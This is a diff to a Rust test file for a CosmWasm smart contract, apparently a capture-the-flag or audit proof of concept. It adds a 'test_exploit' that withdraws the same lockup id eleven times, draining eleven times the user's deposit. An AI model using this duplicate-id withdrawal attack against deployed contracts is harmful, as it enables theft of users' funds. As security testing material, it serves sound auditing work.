@@ -45,9 +45,11 @@ pub mod tests {
         );
 
         // mint funds to user
+        //@note user starts with 10000 tokens
         app = mint_tokens(app, USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);
 
         // deposit
+        //@note user deposits 10000 tokens
         let msg = ExecuteMsg::Deposit {};
         let sender = Addr::unchecked(USER);
         app.execute_contract(
@@ -104,5 +106,34 @@ pub mod tests {
         // verify funds received
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
+    }
+
+    #[test]
+    fn test_exploit(){
+        let (mut app, contract_address) = proper_instantiate();
+        //USER now has a lockup, fast forward by lockup period 
+        //fast-forward by lock period
+        app.update_block( |block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+        let sender = Addr::unchecked(USER);
+        let msg = ExecuteMsg::Withdraw{ ids: vec![1; 11] };
+        let send_funds = vec![];
+        match app.execute_contract(
+            sender.clone(),
+            contract_address.clone(),
+            &msg,
+            &send_funds
+        ) {
+            Ok(_) => {
+                let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+                assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(11));
+            },
+            Err(_) => {
+                println!("contract execution failed");
+                assert!(false);
+            }
+        }
+        
     }
 }
